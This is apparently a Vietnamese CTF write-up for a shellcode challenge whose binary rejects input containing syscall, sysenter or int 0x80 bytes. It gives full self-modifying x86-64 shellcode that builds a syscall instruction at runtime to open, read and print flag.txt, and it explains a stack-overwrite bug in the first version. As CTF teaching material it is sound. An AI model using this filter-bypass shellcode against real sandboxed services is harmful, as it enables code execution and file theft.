## Lược qua:
Challenge đọc shellcode từ input người dùng, lọc và thực thi nó, binary sẽ thoát nếu shellcode bao gồm các syscall instructions (lời gọi hệ thống)


___
## Cách giải

### Thông tin:
* Challenge đưa ra các file:
```
Dockerfile
vuln
flag.txt
```
* Kiểm tra thông tin file:
```
└─$ file vuln 
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d09e382b902cb23837b58db43648051472523f0d, for GNU/Linux 3.2.0, not stripped
```
* File **64-bit**
```c
└─$ checksec --file=vuln 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX disabled   PIE enabled     No RPATH   No RUNPATH   53 Symbols  No     0               2               vuln
```
* `NX disabled`: có thể thực thị shellcode trên stack

Chạy binary:

<img width="810" height="84" alt="image" src="https://github.com/user-attachments/assets/040b1bf2-f9f1-4463-b046-5214ac760cc1" />

Function đáng chú ý chỉ có main() 

Disassemle trong ghidra:
```c
undefined8 main(void)

{
  long lVar1;
  int mproc;
  ssize_t read;
  long in_FS_OFFSET;
  int index;
  short char;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  printf("Your shellcode: ");
  read = ::read(0,shellcode,4096);
  if ((int)read < 1) {
    perror("Read failed !!!");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  mproc = mprotect(shellcode,0x1000,5);
  if (mproc != 0) {
    perror("Mprotect failed !!!");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  close(0);
  index = 0;
  while( true ) {
    if ((int)read + -1 <= index) {
      (*shellcode)();
      if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return 0;
    }
    char = *(short *)(shellcode + index);
    if (((char == 0x50f) || (char == 0x340f)) || (char == -0x7f33)) break;
    index = index + 1;
  }
  puts("Found forbidden bytes !!!");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```
Từ disassembly code, ta chú ý:
* `read = ::read(0,shellcode,4096);` đọc lượng lớn thông tin từ user (4096 bytes)
* `mproc = mprotect(shellcode,0x1000,5);`: là quyền truy cập RWE cho vị trí shellcode
  * `shellcode`: vị trí trên memory
  * `0x1000`: là kích thước vùng lữu trữ (= 4096)
  * `prot = 5`: (= 1 + 4) = PROT_READ | PROT_EXEC - là tại vùng nhớ shellcode, có thể readable and executable

Trong vòng while loop:
* `if (((char == 0x50f) || (char == 0x340f)) || (char == -0x7f33)) break;`:
  Kiếm tra xem trong payload có sử dụng syscall instructions:
  
    | Check     | Hex      | Bytes    | Meaning    |
    | --------- | -------- | ---------- | ---------- |
    | `0x50f`   | `0x050f` | `0f 05`    | `syscall`  |
    | `0x340f`  | `0x340f` | `0f 34`    | `sysenter` |
    | `-0x7f33` | `0x80cd` | `cd 80`    | `int 0x80` |

  binary 64-bit là dùng `syscall`
* Nếu đáp ứng thì:
   `(*shellcode)();`: chương trình sẽ thực thi shellcode
___
### Khai thác:

Vậy ta phải viết shellcode mà không trực tiếp sử dụng đến syscall, tránh bị binary phát hiện forbidden bytes.

Bởi vì chương trình chỉ kiểm tra bytes có sẵn trong shellcode trước excecution, thay vì là thực thi tại runtime

==> Vì vậy, binary không thể kiểm tra bytes trong quá trình runtime execution

Có 2 cách để bypass cái syscall check này: 

* gián tiếp tạo syscall bằng cách lấy giá trị `0e 05` (0x050e), increment bởi 1, ra `0f 05` (0x050f) của syscall

  (hay còn gọi là Self-modifying shellcode)

* tìm value `0f 05` của syscall đâu đó trong memory, ngoài phạm vì của shellcode check và tái sử dụng, call nó

Ta sẽ tiếp cận với cách 1:

Shellcide:
```asm
shellcode = asm(r"""
    // gián tiếp increment giá trị gốc thành syscall, r12 = syscall
    xor rax, rax
    mov eax, 0xc3050e   
    inc eax  
    push rax
    mov r12, rsp       

    // viết tên file: flag.txt
    xor rax, rax
    push rax
    mov rax, 0x7478742e67616c66  
    push rax
    mov rdi, rsp        

    // open file
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    call r12            

    sub rsp, 0x100  // đặc biệt chỗ này, sẽ giải thích sau    

    // read file to memory
    mov rdi, rax        
    mov rsi, rsp        
    mov rdx, 100        
    xor rax, rax        
    call r12

    // write file ra output
    mov rdi, 1          
    mov rax, 1          
    call r12

    // thoát
    mov rax, 60
    xor rdi, rdi
    call r12
""")
```
Trong shellcode này:
* Ta lấy `0xc3050e` (syscall; ret) - (0e 05, c3), để sau khi call syscall tại r12, ta return về shellcode an toàn
* Lấy thanh ghi `r12` vì r12 được gọi là một `callee-saved`, giá trị trong r12 được đảm bảo là bảo toàn
* Còn lại là open, read, write file flag.txt để retrieve flag

Cách là thế, nhưng script ban đầu khi không có `sub rsp, 0x100`, chỉ chạy được local mà server thì không:
* trong shellcode, ta đấy value syscall lên, sau đấy flag lên ngay cạnh nó trên stack
* lúc này, r12 đang trỏ vào value syscall (0f 05 c3), sau đấy ta đấy `null` (8 bytes) + flag.txt (8 bytes), và giờ `rsp` = r12 - 16 
  ```asm
  STACK
  _____________
  | flag.txt  | <- rsp 
  | null      |
  | syscall   | <- r12
  | ...       | 
  ...
  ```
* đến đoạn **read file to memory**, ta chạy `read(fd, buffer=rsp, count=100).`, tức là đọc 100 bytes từ flag.txt vào memory bắt đầu từ `rsp`
* giá trị trong flag.txt sẽ được đọc vào memory từ rsp tràn xuống dưới sao cho đủ 16 bytes (0-15), nhưng từ byte 16 trở đi là sẽ overwrite r12 (syscall)
* lý do, chạy local ra được flag, là vì flag.txt của local rất bé (< 16 bytes), không tràn đến giá trị syscall trên stack. Trong khi flag.txt của server lớn hơn nhiều nên overwrite syscall trên stack.
```c
└─$ cat flag.txt 
KCSC{test}   
```
* Vì thế nên bố sung dòng sau để cấp phát đủ ô nhớ cho flag:
```asm
sub rsp, 0x100
```
* update shellcode và chạy với local flag.txt dài hơn:
```c
└─$ cat flag.txt         
CTF{THIS_IS_A_VERY_LONG_FLAG_THAT_WILL_CRASH_YOUR_STACK}
```
Local:
<img width="800" height="319" alt="image" src="https://github.com/user-attachments/assets/9377e5be-81df-4b2f-ae79-7ea1192a47a3" />

Server:
<img width="803" height="315" alt="image" src="https://github.com/user-attachments/assets/5861d862-512c-4edd-8475-c8329ed61b72" />

Nhận ra điều này khi chạy trên Docker cũng vẫn ra flag.txt: `KCSC{test}`, nhưng chạy server thì không. Nên suy ra lỗi không nằm ở các thanh ghi, mà khả năng value syscall bị corrupted

